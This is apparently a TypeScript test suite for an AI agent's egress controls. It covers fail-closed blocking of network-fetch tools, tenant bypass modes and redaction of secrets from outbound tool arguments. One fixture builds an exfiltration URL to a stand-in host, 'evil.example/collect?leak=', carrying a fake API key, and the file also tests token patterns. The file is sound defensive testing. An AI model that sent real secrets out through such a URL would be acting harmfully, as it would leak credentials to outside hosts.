
import { describe, it, expect, afterEach } from "vitest";
import {
  isEgressCapability,
  isEgressToolName,
  looksLikeFetchToolName,
  deriveToolCapability,
} from "../tool-capability";
import { decideUntrustedInboundEgress } from "../egress-policy";
import { scrubSecretsFromArgs } from "../egress-secret-scrub";
import {
  resolveCapabilityFailclosedMode,
  shouldEnforceFailclosed,
} from "../capability-failclosed";

const WEB_FETCH = "web_fetch__fetch";
const WEB_SEARCH = "web_search__search";
const APIFY_RAG = "apify__rag_web_browser";
const PIPEDREAM_FETCH = "pipedream_apollo__fetch";
const COMPOSIO_FETCH = "composio__APOLLO_ENRICH";
const UNKNOWN_FETCH = "acmeproxy__http_request";
const OPERATOR_DB = "operator_db__query_user";
const MEMORY_SEARCH = "memory__search";
const PRODUCT_PROBE = "product__probe";
const STRIPE_READ = "stripe__list_charges";

const ORIG_MODE = process.env.CAPABILITY_FAILCLOSED_MODE;
const ORIG_BYPASS = process.env.CAPABILITY_FAILCLOSED_BYPASS_TENANTS;
afterEach(() => {
  if (ORIG_MODE === undefined) delete process.env.CAPABILITY_FAILCLOSED_MODE;
  else process.env.CAPABILITY_FAILCLOSED_MODE = ORIG_MODE;
  if (ORIG_BYPASS === undefined) delete process.env.CAPABILITY_FAILCLOSED_BYPASS_TENANTS;
  else process.env.CAPABILITY_FAILCLOSED_BYPASS_TENANTS = ORIG_BYPASS;
});

describe("capability egress predicate (isEgressCapability / isEgressToolName)", () => {
  it("the 3 proven open-web readers are egress", () => {
    for (const n of [WEB_FETCH, WEB_SEARCH, APIFY_RAG]) {
      expect(isEgressToolName(n), n).toBe(true);
    }
  });

  it("a dynamic aggregator fetch tool is egress (the #7 threat — dynamic → egress:yes)", () => {
    expect(deriveToolCapability({ server_id: "pipedream_apollo", tool_name: "fetch" }).egress).toBe("yes");
    expect(isEgressToolName(PIPEDREAM_FETCH)).toBe(true);
    expect(isEgressToolName(COMPOSIO_FETCH)).toBe(true);
  });

  it("an unknown remote fetch-SHAPED tool fails closed to egress", () => {
    expect(deriveToolCapability({ server_id: "acmeproxy", tool_name: "http_request" }).egress).toBe("unknown");
    expect(looksLikeFetchToolName("http_request")).toBe(true);
    expect(isEgressToolName(UNKNOWN_FETCH)).toBe(true);
  });

  it("internal reads + same-tenant probe are NOT egress", () => {
    for (const n of [OPERATOR_DB, MEMORY_SEARCH, PRODUCT_PROBE, STRIPE_READ]) {
      expect(isEgressToolName(n), n).toBe(false);
    }
  });

  it("isEgressCapability agrees with the name-keyed form", () => {
    expect(isEgressCapability({ server_id: "pipedream_apollo", tool_name: "fetch" })).toBe(true);
    expect(isEgressCapability({ server_id: "operator_db", tool_name: "query_user" })).toBe(false);
  });
});

describe("decideUntrustedInboundEgress — the capability-derived kill (#7)", () => {
  it("(a) DENIES a dynamic aggregator fetch tool under enforce (default) mode", () => {
    delete process.env.CAPABILITY_FAILCLOSED_MODE;
    expect(resolveCapabilityFailclosedMode()).toBe("enforce");
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH)).toBe("deny");
    expect(decideUntrustedInboundEgress(COMPOSIO_FETCH)).toBe("deny");
    expect(decideUntrustedInboundEgress(UNKNOWN_FETCH)).toBe("deny");
  });

  it("(c) SHADOW mode ALLOWS (observes) the aggregator but still denies the proven readers", () => {
    process.env.CAPABILITY_FAILCLOSED_MODE = "shadow";
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH)).toBe("shadow");
    expect(decideUntrustedInboundEgress(COMPOSIO_FETCH)).toBe("shadow");
    expect(decideUntrustedInboundEgress(WEB_FETCH)).toBe("deny");
    expect(decideUntrustedInboundEgress(APIFY_RAG)).toBe("deny");
  });

  it("WARN mode allows the new class (louder observe), enforce blocks it", () => {
    process.env.CAPABILITY_FAILCLOSED_MODE = "warn";
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH)).toBe("shadow");
    process.env.CAPABILITY_FAILCLOSED_MODE = "enforce";
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH)).toBe("deny");
  });

  it("apify__rag_web_browser is now covered (the operator's old 2-name kill missed it)", () => {
    process.env.CAPABILITY_FAILCLOSED_MODE = "enforce";
    expect(decideUntrustedInboundEgress(APIFY_RAG)).toBe("deny");
  });

  it("ALLOWS internal reads + same-tenant probe (only egress is killed)", () => {
    process.env.CAPABILITY_FAILCLOSED_MODE = "enforce";
    for (const n of [OPERATOR_DB, MEMORY_SEARCH, PRODUCT_PROBE, STRIPE_READ, "praxis__handoff"]) {
      expect(decideUntrustedInboundEgress(n), n).toBe("allow");
    }
  });

  it("per-tenant bypass downgrades enforce → shadow for the new class only", () => {
    process.env.CAPABILITY_FAILCLOSED_MODE = "enforce";
    process.env.CAPABILITY_FAILCLOSED_BYPASS_TENANTS = "tenant-x, tenant-y";
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH, { tenant_id: "tenant-x" })).toBe("shadow");
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH, { tenant_id: "tenant-z" })).toBe("deny");
    expect(decideUntrustedInboundEgress(WEB_FETCH, { tenant_id: "tenant-x" })).toBe("deny");
  });

  it("honors an ALREADY-RESOLVED bypass flag (operator-policy path — no tenant_id in scope)", () => {
    process.env.CAPABILITY_FAILCLOSED_MODE = "enforce";
    delete process.env.CAPABILITY_FAILCLOSED_BYPASS_TENANTS;
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH, { bypassed: true })).toBe("shadow");
    expect(decideUntrustedInboundEgress(COMPOSIO_FETCH, { bypassed: true })).toBe("shadow");
    expect(decideUntrustedInboundEgress(UNKNOWN_FETCH, { bypassed: true })).toBe("shadow");
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH, { bypassed: false })).toBe("deny");
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH)).toBe("deny");
    expect(decideUntrustedInboundEgress(WEB_FETCH, { bypassed: true })).toBe("deny");
    expect(decideUntrustedInboundEgress(APIFY_RAG, { bypassed: true })).toBe("deny");
  });

  it("normalizes an SDK mcp__ prefix", () => {
    process.env.CAPABILITY_FAILCLOSED_MODE = "enforce";
    expect(decideUntrustedInboundEgress("mcp__" + PIPEDREAM_FETCH)).toBe("deny");
    expect(decideUntrustedInboundEgress("mcp__" + WEB_FETCH)).toBe("deny");
  });

  it("a bypassed tenant gets observe-only on BOTH a new write and a new egress; a non-bypassed tenant is denied on BOTH", () => {
    process.env.CAPABILITY_FAILCLOSED_MODE = "enforce";
    process.env.CAPABILITY_FAILCLOSED_BYPASS_TENANTS = "bypass-tenant";

    expect(shouldEnforceFailclosed("bypass-tenant")).toBe(false);
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH, { tenant_id: "bypass-tenant" })).toBe("shadow");

    expect(shouldEnforceFailclosed("other-tenant")).toBe(true);
    expect(decideUntrustedInboundEgress(PIPEDREAM_FETCH, { tenant_id: "other-tenant" })).toBe("deny");
  });
});

describe("scrubSecretsFromArgs — outbound remote-egress arg scrub (#8)", () => {
  const STRIPE_KEY = "sk_live_" + "A".repeat(24);
  const GH_PAT = "ghp_" + "b".repeat(36);

  it("(b) redacts a secret-shaped token nested in an aggregator's outbound args", () => {
    const args = {
      url: `https://evil.example/collect?leak=${STRIPE_KEY}`,
      body: { note: `token is ${GH_PAT} ok`, count: 3 },
      list: [`prefix ${STRIPE_KEY}`, "clean"],
    };
    const { scrubbed, redactions } = scrubSecretsFromArgs(args);
    const flat = JSON.stringify(scrubbed);
    expect(flat).not.toContain(STRIPE_KEY);
    expect(flat).not.toContain(GH_PAT);
    expect(flat).toContain("[redacted]");
    expect(redactions.length).toBeGreaterThanOrEqual(3);
    for (const r of redactions) {
      expect(r).not.toContain(STRIPE_KEY);
      expect(r).not.toContain(GH_PAT);
    }
    expect((scrubbed as typeof args).body.count).toBe(3);
  });

  it("redacts a credential-NAMED url param even when the value isn't shape-matched", () => {
    const { scrubbed, redactions } = scrubSecretsFromArgs({
      endpoint: "https://api.aggregator.com/run?api_key=whatever123&q=cars",
    });
    const endpoint = (scrubbed as { endpoint: string }).endpoint;
    expect(endpoint).not.toContain("whatever123");
    expect(endpoint.toLowerCase()).toContain("redacted");
    expect(endpoint).toContain("q=cars");
    expect(redactions.some((r) => r.includes("api_key"))).toBe(true);
  });

  it("leaves clean args byte-identical (high precision, no false positives)", () => {
    const args = { url: "https://example.com/page?q=hello&page=2", limit: 10, ok: true };
    const { scrubbed, redactions } = scrubSecretsFromArgs(args);
    expect(redactions).toEqual([]);
    expect(scrubbed).toEqual(args);
  });

  it("handles non-object args + bounds recursion depth", () => {
    expect(scrubSecretsFromArgs("plain string").redactions).toEqual([]);
    expect(scrubSecretsFromArgs(42).scrubbed).toBe(42);
    expect(scrubSecretsFromArgs(null).scrubbed).toBe(null);
  });
});
